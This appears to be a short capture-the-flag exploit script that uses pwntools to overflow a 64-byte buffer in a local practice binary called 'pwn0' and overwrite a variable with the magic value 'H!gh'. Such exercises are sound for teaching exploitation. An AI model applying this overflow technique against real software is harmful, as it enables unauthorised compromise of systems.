from pwn import *

ex = "./pwn0"
p = process(ex)

offset = 64
buffer = b'A' * offset

msg = buffer + b'H!gh'

p.sendline(msg)
out = p.recvall()

print(out)
